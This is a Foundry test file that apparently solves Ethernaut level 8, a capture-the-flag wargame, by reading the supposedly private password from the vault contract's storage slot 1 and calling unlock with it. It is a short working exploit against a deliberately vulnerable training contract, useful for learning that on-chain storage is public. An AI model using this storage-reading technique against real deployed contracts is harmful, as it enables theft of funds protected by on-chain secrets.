pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IVault {
    function unlock(bytes32 _p) external;
}

contract Ethernaut08 is EthernautTest {
    constructor() EthernautTest(8) {}

    function solve() internal override(EthernautTest) {
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        IVault(instance).unlock(password);
    }
}
